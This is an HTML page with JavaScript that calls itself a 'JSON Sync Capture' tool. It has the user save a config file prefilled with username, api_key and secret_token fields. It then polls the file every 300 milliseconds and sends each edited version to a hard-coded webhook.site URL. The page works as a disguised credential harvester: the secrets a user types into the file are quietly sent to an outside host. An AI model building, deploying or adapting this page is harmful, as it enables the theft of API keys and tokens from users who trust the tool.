<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>💪 Strong JSON Sync Capture</title>
<style>
body { font-family: Arial; background: #f4f7fb; padding: 40px; }
.box { background:white; padding:25px; border-radius:10px; max-width:520px; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
button { padding:12px 18px; background:#2563eb; color:white; border:none; border-radius:6px; cursor:pointer;}
#status {margin-top:15px; color:#333;}
#log {margin-top:15px; background:#0f172a; color:#22c55e; padding:10px; height:180px; overflow:auto; font-size:12px;}
.highlight { color: yellow; }
</style>
</head>
<body>

<div class="box">
<h2>☁️ Strong JSON Sync Capture</h2>
<p>Save a JSON file, edit it in any editor, and this will capture every change to a webhook.</p>

<button onclick="start()">Start Monitoring</button>

<div id="status"></div>
<div id="log"></div>
</div>

<script>
let fileHandle;
let lastContent = "";
let monitoring = false;
const webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; // Replace with your webhook

function log(msg){ document.getElementById("log").innerHTML += msg + "<br>"; }
function status(msg){ document.getElementById("status").innerText = msg; }

async function start() {
    try {
        fileHandle = await window.showSaveFilePicker({
            suggestedName: "sync-config.json",
            types:[{description:"JSON Config File", accept:{"application/json":[".json"]}}]
        });

        const writable = await fileHandle.createWritable();
        const initialContent = JSON.stringify({username:"",api_key:"",secret_token:""}, null, 2);
        await writable.write(initialContent);
        await writable.close();

        lastContent = initialContent;
        status("✅ JSON file created. Now monitoring changes...");
        monitorFile();
    } catch(e) {
        status("Error: "+e.message);
    }
}

// Aggressive polling every 300ms, catching edits while file is open
function monitorFile(){
    if(monitoring) return;
    monitoring = true;

    setInterval(async()=>{
        if(!fileHandle) return;
        try {
            const file = await fileHandle.getFile();
            const text = await file.text();
            if(text !== lastContent){
                log("📡 Detected JSON change:");
                log(`<pre>${text}</pre>`);
                lastContent = text;

                try {
                    const jsonData = JSON.parse(text);
                    sendWebhook(jsonData);
                } catch(err){
                    log("❌ Invalid JSON, not sent");
                }
            }
        } catch(e){
            log("❌ File read error: "+e.message);
        }
    }, 300); // Fast polling
}

// Send updated JSON to webhook
async function sendWebhook(jsonData){
    try{
        const payload = {timestamp:new Date().toISOString(), content: jsonData};
        const res = await fetch(webhookURL,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify(payload)
        });
        if(res.ok){
            log("🚀 Webhook sent successfully.");
        }else{
            log("❌ Failed webhook request.");
        }
    }catch(e){
        log("❌ Error sending webhook: "+e.message);
    }
}
</script>

</body>
</html>
